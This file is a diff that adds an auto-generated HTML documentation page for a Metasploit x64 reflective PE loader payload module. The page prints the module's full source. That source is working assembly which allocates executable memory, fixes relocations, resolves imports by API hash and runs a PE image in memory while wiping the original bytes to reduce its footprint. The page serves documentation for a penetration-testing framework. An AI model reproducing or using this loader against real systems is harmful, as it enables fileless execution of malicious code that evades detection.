@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Windows::ReflectivePELoader_x64
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Windows::ReflectivePELoader_x64";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (R)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">ReflectivePELoader_x64</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Windows::ReflectivePELoader_x64
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="BlockApi_x64.html" title="Msf::Payload::Windows::BlockApi_x64 (module)">BlockApi_x64</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/windows/x64/reflective_pe_loader_x64.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#asm_reflective_pe_loader_x64-instance_method" title="#asm_reflective_pe_loader_x64 (instance method)">#<strong>asm_reflective_pe_loader_x64</strong>(opts)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="BlockApi_x64.html" title="Msf::Payload::Windows::BlockApi_x64 (module)">BlockApi_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="BlockApi_x64.html#asm_block_api-instance_method" title="Msf::Payload::Windows::BlockApi_x64#asm_block_api (method)">#asm_block_api</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="asm_reflective_pe_loader_x64-instance_method">
+  
+    #<strong>asm_reflective_pe_loader_x64</strong>(opts)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reflective_pe_loader_x64.rb', line 6</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_reflective_pe_loader_x64'>asm_reflective_pe_loader_x64</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_prologue'>prologue</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:is_dll</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span>
+    <span class='id identifier rubyid_prologue'>prologue</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%(</span><span class='tstring_content'>
+  mov rcx,r13                     ; hinstDLL
+  mov rdx,0x01                    ; fdwReason
+  xor r8,r8                       ; lpReserved
+  </span><span class='tstring_end'>)</span></span>
+  <span class='kw'>end</span>
+
+  <span class='tstring'><span class='tstring_beg'>%^</span><span class='tstring_content'>
+stub:
+  pop rsi                         ; Get the address of image to rsi
+  call $+5                        ; Push the current RIP value to stack
+  cld                             ; Clear direction flags
+  sub [rsp],rsi                   ; Subtract the address of pre mapped PE image and get the image_size+8 to ST[0]
+  mov rbp,rsp                     ; Copy current stack address to rbp
+  and rbp,-0x1000                 ; Create a new shadow stack address
+  mov eax,dword [rsi+0x3C]        ; Get the offset of &quot;PE&quot; to eax
+  mov rbx,qword [rax+rsi+0x30]    ; Get the image base address to rbx
+  mov r12d,dword [rax+rsi+0x28]   ; Get the address of entry point to r12
+  mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
+  mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
+  mov rdx,[rsp]                   ; dwSize
+  xor rcx,rcx                     ; lpAddress
+  xchg rsp,rbp                    ; Swap shadow stack
+  mov r10d,</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  call api_call                   ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+  xchg rsp,rbp                    ; Swap shadow stack
+  mov rdi,rax                     ; Save the new base address to rdi
+  xor rax,rax                     ; Zero out the RAX
+  xor r8,r8                       ; Zero out the R8
+  xor r13,r13                     ; Zero out the R13
+  xor r14,r14                     ; Zero out the R14
+  mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER (&quot;PE&quot;)
+  mov ecx,dword [rax+rsi+0xB4]    ; Base relocation table size
+  mov eax,dword [rax+rsi+0xB0]    ; Base relocation table RVA
+  add rax,rsi                     ; Base relocation table memory address
+  add rcx,rax                     ; End of base relocation table
+calc_delta:
+  mov rdx,rdi                     ; Move the new base address to rdx
+  sub rdx,rbx                     ; Delta value
+  mov r13d,dword [rax]            ; Move the reloc RVA to R13D
+  mov r14d,dword [rax+4]          ; Move the reloc table size to R14D
+  add rax,0x08                    ; Move to the reloc descriptor
+  jmp fix                         ; Start fixing
+get_rva:
+  cmp rcx,rax                     ; Check if the end of the reloc section
+  jle reloc_fin                   ; If yes goto fin
+  mov r13d,dword [rax]            ; Move the new reloc RVA
+  mov r14d,dword [rax+4]          ; Move the new reloc table size
+  add rax,0x08                    ; Move 8 bytes
+fix:
+  cmp r14w,0x08                   ; Check if the end of the reloc block
+  jz get_rva                      ; If yes set the next block RVA
+  mov r8w,word [rax]              ; Move the reloc desc to r8w
+  cmp r8w, 0x00                   ; Check if it is a padding word
+  je pass                         ; Pass padding bytes
+  and r8w,0x0FFF                  ; Get the last 12 bits
+  add r8d,r13d                    ; Add block RVA to desc value
+  add r8,rsi                      ; Add the start address of the image
+  add [r8],rdx                    ; Add the delta value to calculated absolute address
+pass:
+  sub r14d,0x02                   ; Decrease the index
+  add rax,0x02                    ; Move to the next reloc desc.
+  xor r8,r8                       ; Zero out r8
+  jmp fix                         ; Loop
+reloc_fin:                        ; All done !
+  xor r14,r14                     ; Zero out r14
+  xor r15,r15                     ; Zero out r15
+  xor rcx,rcx                     ; Zero out rcx
+  mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER (&quot;PE&quot;)
+  mov eax,dword [rax+rsi+0x90]    ; Import table RVA
+  add rax,rsi                     ; Import table memory address (first image import descriptor)
+  push rax                        ; Save import descriptor to stack
+get_modules:
+  cmp dword [rax],0               ; Check if the import names table RVA is NULL
+  jz complete                     ; If yes building process is done
+  mov ecx,dword [rax+0x0C]        ; Get RVA of dll name to eax
+  add rcx,rsi                     ; Get the dll name address
+  call LoadLibraryA               ; Load the library
+  mov r13,rax                     ; Move the dll handle to R13
+  mov rax,[rsp]                   ; Move the address of current _IMPORT_DESCRIPTOR to eax
+  call get_procs                  ; Resolve all windows API function addresses
+  add dword [rsp],0x14            ; Move to the next import descriptor
+  mov rax,[rsp]                   ; Set the new import descriptor address to eax
+  jmp get_modules                 ; Get other modules
+get_procs:
+  mov r14d,dword [rax+0x10]       ; Save the current import descriptor IAT RVA
+  add r14,rsi                     ; Get the IAT memory address
+  mov rax,[rax]                   ; Set the import names table RVA to eax
+  add rax,rsi                     ; Get the current import descriptor&#39;s import names table address
+  mov r15,rax                     ; Save &amp;INT to R15
+resolve:
+  cmp dword [rax],0x00            ; Check if end of the import names table
+  jz all_resolved                 ; If yes resolving process is done
+  mov rax,[rax]                   ; Get the RVA of function hint to eax
+  btr rax,63                      ; Check if the high order bit is set
+  jnc name_resolve                ; If high order bit is not set resolve with INT entry
+  shl rax,2                       ; Discard the high bit by shifting
+  shr rax,2                       ; Shift back the original value
+  call GetProcAddress             ; Get the API address with hint
+  jmp insert_iat                  ; Insert the address of API tı IAT
+name_resolve:
+  add rax,rsi                     ; Set the address of function hint
+  add rax,0x02                    ; Move to function name
+  call GetProcAddress             ; Get the function address to eax
+insert_iat:
+  mov [r14],rax                   ; Insert the function address to IAT
+  add r14,0x08                    ; Increase the IAT index
+  add r15,0x08                    ; Increase the import names table index
+  mov rax,r15                     ; Set the address of import names table address to eax
+  jmp resolve                     ; Loop
+all_resolved:
+  mov qword [r14],0x00            ; Insert a NULL dword
+  ret                             ; &lt;-
+LoadLibraryA:
+  ;mov rcx,rax                     ; Move the address of library name string to RCX
+  xchg rbp,rsp                     ; Swap shadow stack
+  mov r10d,</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LoadLibraryA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  call api_call                   ; LoadLibraryA(RCX)
+  xchg rbp,rsp                    ; Swap shadow stack
+  ret                             ; &lt;-
+GetProcAddress:
+  xchg rbp,rsp                    ; Swap shadow stack
+  mov rcx,r13                     ; Move the module handle to RCX as first parameter
+  mov rdx,rax                     ; Move the address of function name string to RDX as second parameter
+  mov r10d,</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GetProcAddress</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  call api_call                   ; GetProcAddress(ebx,[esp+4])
+  xchg rbp,rsp                    ; Swap shadow stack
+  ret                             ; &lt;-
+complete:
+  pop rax                         ; Clean out the stack
+  pop rcx                         ; Pop the ImageSize into RCX
+  push rdi                        ; Save ImageBase to stack
+  mov r13,rdi                     ; Copy the new base value to r13
+  add r13,r12                     ; Add the address of entry value to new base address
+memcpy:
+  mov al,[rsi]                    ; Move 1 byte of PE image to AL register
+  mov [rdi],al                    ; Move 1 byte of PE image to image base
+  mov byte [rsi],0x00             ; Overwrite copied byte (for less memory footprint)
+  inc rsi                         ; Increase PE image index
+  inc rdi                         ; Increase image base index
+  loop memcpy                     ; Loop until zero
+PE_start:
+  pop r13                         ; Pop the image base to r13
+  or rcx,-1                       ; hProcess
+  xor rdx,rdx                     ; lpBaseAddress
+  xor r8,r8                       ; hProcess
+  xchg rbp,rsp                    ; Swap shadow stack
+  mov r10d,</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FlushInstructionCache</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  call api_call                   ; FlushInstructionCache(0xffffffff,NULL,NULL);
+  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_prologue'>prologue</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  add r13,r12                     ; Add the address of entry value to image base
+  call r13                        ; Call the AOE
+  and rsp,-0x10                   ; Align stack
+  mov rcx,0x00                    ; dwExitCode
+  mov r10d,</span><span class='embexpr_beg'>#{</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>0x%.8x</span><span class='tstring_end'>&#39;</span></span> <span class='op'>%</span> <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span><span class='period'>.</span><span class='id identifier rubyid_exit_types'><span class='object_link'><a href="../Windows.html#exit_types-class_method" title="Msf::Payload::Windows.exit_types (method)">exit_types</a></span></span><span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  call api_call                   ; Call exit funk based on exit_type
+  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_block_api'>asm_block_api</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:32:04 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
